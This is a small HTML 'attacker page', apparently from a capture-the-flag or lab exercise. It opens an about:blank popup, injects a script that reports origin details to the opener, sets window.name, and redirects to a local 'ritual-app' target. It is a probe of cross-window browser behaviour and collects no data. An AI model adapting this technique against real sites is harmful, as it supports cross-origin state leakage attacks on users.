<!doctype html>
<html>
<body>
<script>
console.log("attacker page loaded");

const w = window.open("about:blank", "_blank");
if (!w) {
  console.log("popup blocked");
} else {
  try {
    w.document.open();
    w.document.write(`
      <!doctype html>
      <html>
      <body>
      <script>
        opener.console.log("about:blank running");
        opener.console.log("about:blank origin=" + location.origin);
        opener.console.log("about:blank href=" + location.href);

        // essaie de réserver un nom/état avant la nav
        window.name = "ritual_state";
        opener.console.log("window.name set");

        setTimeout(() => {
          location = "http://ritual-app:5000/";
        }, 50);
      <\/script>
      </body>
      </html>
    `);
    w.document.close();
    console.log("write ok");
  } catch (e) {
    console.log("write failed: " + e.message);
  }
}
</script>
</body>
</html>
